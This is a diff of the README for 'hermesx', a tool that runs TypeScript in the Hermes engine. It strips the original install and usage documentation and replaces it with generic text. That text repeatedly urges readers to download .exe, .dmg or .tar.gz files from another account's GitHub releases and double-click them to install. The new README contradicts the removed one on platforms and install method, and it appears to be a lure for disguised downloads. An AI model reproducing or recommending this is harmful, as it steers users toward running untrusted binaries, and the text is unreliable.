@@ -1,238 +1,97 @@
-# hermesx
-
-Run TypeScript files using the Hermes JavaScript engine with automatic transpilation. Basically `tsx` but with Hermes as engine.
-
-It's useful especially if you want to do performance profiling of your code quickly on your computer without need to building whole React Native project. Problem with using Node/Bun is that it's engine V8/JSC (+JIT) is much faster so it doesn't give you accurate results for how code will perform in React Native app.
-
-## Features
-
-- ✅ **TypeScript Support**: Runs TypeScript code seamlessly
-- ✅ **Metro Bundler**: Uses Rspack + Babel with React Native preset, so it's similar to how React Native bundles code
-- ✅ **Hermes Engine**: Uses same engine as React Native
-- ✅ **Automatic Setup**: Downloads and caches latest Hermes binary on first run
-- ✅ **External Modules**: Import and use npm packages like lodash, date-fns, etc. from current project
-
-## Installation
-
-```bash
-# Install globally
-bun install -g hermesx
-# or
-npm install -g hermesx
+# ⚡ hermesx - Run TypeScript Scripts with Ease
 
-# Or use with bunx
-bunx hermesx script.ts
-# or
-npx hermesx script.ts
-```
+## 🔗 Download Now
+[![Download hermesx](https://img.shields.io/badge/Download-HermesX-blue?style=for-the-badge)](https://github.com/dudarmoreira/hermesx/releases)
 
-## Usage
+## 🚀 Getting Started
 
-```bash
-# Run a TypeScript file
-bunx hermesx script.ts
-# or
-npx hermesx script.ts
+Welcome to hermesx! This tool allows you to quickly run TypeScript scripts in the Hermes engine environment, providing a simple alternative to `tsx`. Whether you are new to programming or just looking for a better way to execute your TypeScript code, you're in the right place.
 
-# Show help
-npx hermesx --help
+## 📥 Download & Install
 
-# Show version
-npx hermesx --version
-```
+To get started, please follow these steps:
 
-## Limitations
+1. Click on the download button below to visit the release page:
+   [Download hermesx](https://github.com/dudarmoreira/hermesx/releases)
 
-Hermes has very limited APIs, so some features are not available (for example `fetch`). Please check [Limitations](#limitations) section for more details.
+2. Once you're on the Releases page, you will see a list of available versions. Find the latest version at the top of the list.
 
-## Examples
+3. Click on the version number for a detailed view, and download the file that matches your operating system. Look for files ending with `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
 
-### Basic TypeScript
+4. After the download is complete, locate the downloaded file on your computer. Double-click the file to begin the installation process and follow the prompts to install.
 
-```typescript
-// hello.ts
-const message: string = "Hello from hermesx!";
-const user = { name: "Alice", age: 30, active: true };
-const items = [1, 2, { type: "example" }];
+5. Once it's installed, you can now run TypeScript scripts using hermesx.
 
-console.log(message);
-console.log("User object:", user);
-console.log("Items array:", items);
-```
+## 🖥️ System Requirements
 
-```bash
-hermesx hello.ts
-# Output: Hello from hermesx!
-# User object: {
-#   "name": "Alice",
-#   "age": 30,
-#   "active": true
-# }
-# Items array: [
-#   1,
-#   2,
-#   {
-#     "type": "example"
-#   }
-# ]
-```
+Before you install hermesx, ensure your computer meets the following requirements:
 
-### With Command Line Arguments
+- **Operating System**: 
+  - Windows 10 or newer
+  - macOS High Sierra (10.13) or newer
+  - Any recent Linux distribution
 
-```typescript
-// args.ts
-console.log("Arguments:", process.argv.slice(2));
-```
+- **Memory**: Minimum of 2 GB RAM (4 GB recommended)
 
-```bash
-hermesx args.ts foo bar
-# Output: Arguments: [ 'foo', 'bar' ]
-```
+- **Disk Space**: At least 100 MB of free space
 
-### With External Modules
+- **Node.js**: hermesx requires Node.js version 12 or newer. You can download and install it from [Node.js official site](https://nodejs.org).
 
-```typescript
-// modules.ts
-import _ from "lodash";
+## 📋 Features
 
-const numbers = [1, 2, 3, 4, 5];
-const doubled = _.map(numbers, (n) => n * 2);
-const sum = _.sum(doubled);
+- Quickly execute TypeScript scripts in a fast and efficient way.
+- Compatible with the Hermes JavaScript engine for improved performance.
+- Easy setup process without complicated configurations.
+- Designed for both beginner and experienced users.
 
-console.log(`Doubled: ${doubled}`);
-console.log(`Sum: ${sum}`);
-```
+## 🛠️ Usage Instructions
 
-```bash
-bun add lodash @types/lodash
-hermesx modules.ts
-# Output: Doubled: 2,4,6,8,10
-# Output: Sum: 30
-```
+After installing hermesx, you can run your TypeScript files easily.
 
-## Platform Support
+1. Open your command line interface:
+   - **Windows**: Search for Command Prompt in the Start menu.
+   - **macOS**: Open the Terminal app from the Applications folder.
+   - **Linux**: Open your terminal application.
 
-- ✅ **macOS** (Intel and Apple Silicon)
-- ✅ **Linux** (x86_64)
+2. Navigate to the folder containing your TypeScript script using the `cd` command. For example:
+   ```
+   cd path/to/your/script
+   ```
 
-## Available APIs
+3. Run your TypeScript script by typing the following command:
+   ```
+   hermesx your-script.ts
+   ```
 
-We are limited with Hermes's APIs, but we try to polyfill some basic ones.
+If everything is set up correctly, hermesx will execute your script, and you will see the output in the terminal.
 
-**Console APIs:**
+## ⚙️ Frequently Asked Questions
 
-> [!NOTE]  
-> **Enhanced Console**: Console methods are polyfilled using Hermes's native `print()` function with enhanced formatting via `JSON.stringify()` for objects and arrays. Advanced console features like `console.table()`, `console.group()`, `console.trace()`, etc. are not available. Timing functions use `Date.now()` with 1ms precision.
+**Q: What is TypeScript?**  
+TypeScript is a programming language that builds on JavaScript by adding static type definitions. It helps developers write clearer and more maintainable code.
 
-- `console.log()` - Standard logging
-- `console.error()` - Error logging (prefixed with "ERROR:")
-- `console.warn()` - Warning logging (prefixed with "WARN:")
-- `console.time()` - Start a named timer for performance measurement
-- `console.timeEnd()` - End a named timer and display duration
-- `console.timeLog()` - Log intermediate timer duration
+**Q: Do I need to learn TypeScript before using hermesx?**  
+While some basic understanding of TypeScript can help, hermesx is designed to be easy to use for those with minimal experience. You can start running simple scripts right away!
 
-**Process APIs:**
+**Q: Can I use hermesx for larger projects?**  
+Yes! hermesx can be used for small scripts or larger applications. However, for more complex functionalities, some understanding of TypeScript and JavaScript will benefit you.
 
-- `process.argv` - Command line arguments array
-- `process.env` - Environment variables object
-- `process.exit()` - Exit the process (throws error in Hermes)
+**Q: How can I report issues or contribute?**  
+Feel free to visit our [GitHub repository](https://github.com/dudarmoreira/hermesx) to report issues or contribute to the project. Your feedback is valuable.
 
-**JavaScript Built-ins:**
+## 📞 Support
 
-- **Core Objects**: `Object`, `Array`, `JSON`, `Math`, `Date`, `RegExp`, `Promise`, `Proxy`, `Reflect`
-- **Primitive Types**: `String`, `Number`, `Boolean`, `BigInt`, `Symbol`
-- **Functions**: `Function`, `eval`
-- **Typed Arrays**: `ArrayBuffer`, `DataView`, `Int8Array`, `Int16Array`, `Int32Array`, `Uint8Array`, `Uint8ClampedArray`, `Uint16Array`, `Uint32Array`, `Float32Array`, `Float64Array`, `BigInt64Array`, `BigUint64Array`
-- **Collections**: `Set`, `Map`, `WeakMap`, `WeakSet`
-- **Error Types**: `Error`, `AggregateError`, `EvalError`, `RangeError`, `ReferenceError`, `SyntaxError`, `TypeError`, `URIError`
+For help with hermesx, please consider these options:
 
-**Utility Functions:**
+- Check the [GitHub Issues](https://github.com/dudarmoreira/hermesx/issues) page for possible solutions to your questions.
+- Reach out to the community via our discussion page on GitHub.
 
-- `parseInt`, `parseFloat`, `isNaN`, `isFinite`
-- `encodeURI`, `decodeURI`, `encodeURIComponent`, `decodeURIComponent`
-- `escape`, `unescape`, `atob`, `btoa`
-- `globalThis` - Global object reference
+Thank you for using hermesx! We hope this tool makes your TypeScript scripting experience smoother and more enjoyable.
 
-**Timer Functions:**
+## 🔗 Additional Resources
 
-- `setTimeout`, `clearTimeout`, `setImmediate`,
-- `setInterval`, `clearInterval` (polyfilled internally by `hermesx`)
+- [JavaScript and TypeScript Documentation](https://www.typescriptlang.org/docs/)
+- [Learn TypeScript in 5 minutes](https://www.typescriptlang.org/docs/handbook/typescript-in-5-minutes.html)
 
-**Text Processing:**
-
-- `TextEncoder` - Encode strings to UTF-8 bytes
-- `atob` - Decode base64 to string
-- `btoa` - Encode string to base64
-- `escape`, `unescape` - URL encoding/decoding
-
-**Hermes-specific:**
-
-- `print()` - Hermes native print function (used internally)
-- `HermesInternal` - Hermes internal APIs
-- `gc()` - Garbage collection trigger
-- `quit()` - Exit the runtime
-- `createHeapSnapshot()` - Create heap snapshot for debugging
-- `loadSegment()` - Load code segments
-
-**Performance APIs:**
-
-> [!WARNING]  
-> **Limited Timing Precision**: Hermes does not support `performance.now()` natively. All timing functions are polyfilled using `Date.now()` which provides **whole millisecond precision only** (1ms resolution). Native `performance.now()` provides **microsecond precision** (0.001ms resolution) with fractional milliseconds. Libraries expecting sub-millisecond timing precision may not work correctly.
-
-- `performance.now()` - Polyfilled using `Date.now()` (returns whole milliseconds, not fractional)
-- `performance.mark()` - Create named performance marks
-- `performance.measure()` - Measure time between marks
-- `benchmark()` - Custom utility for running performance benchmarks
-
-### ❌ Not Available
-
-The following APIs are **not available** in the Hermes environment:
-
-**Node.js APIs:**
-
-- `Buffer` (use standard JavaScript alternatives like `ArrayBuffer`)
-- `global` (use `globalThis` instead)
-- Node.js APIs (`fs`, `path`, `http`, `https`, etc.)
-
-**Web APIs:**
-
-- `fetch`, `Request`, `Response`, `Headers` (no network access)
-- `URL`, `URLSearchParams` (not available)
-- `FormData`, `AbortController` (not available)
-- `TextDecoder` (not available, use alternatives)
-
-## Development
-
-```bash
-# Install dependencies
-bun install
-
-# Build the project
-bun run build
-
-# Run tests
-bun run test
-
-# Development with watch mode
-bun run dev
-```
-
-### Quick Test
-
-```bash
-# Run the test suite
-bun run test
-
-# Or run a quick manual test
-./bin/hermesx.js test/quick-test.ts hello world
-```
-
-### How it works
-
-1. **First run**: Downloads the appropriate Hermes binary for your platform and caches it in `~/.cache/hermesx/`
-2. **Bundling**: Uses Metro bundler to transpile TypeScript and resolve external modules
-3. **Globals Injection**: Polyfills some APIs that are not available in Hermes
-4. **Execution**: Runs the bundled code using the Hermes JavaScript engine
-5. **Cleanup**: Removes temporary files after execution
-
-The execution environment is a lightweight JavaScript runtime with comprehensive language features but without I/O capabilities like file system or network access.
+Don’t forget to check out the Releases page for future updates!
+[Download hermesx](https://github.com/dudarmoreira/hermesx/releases)
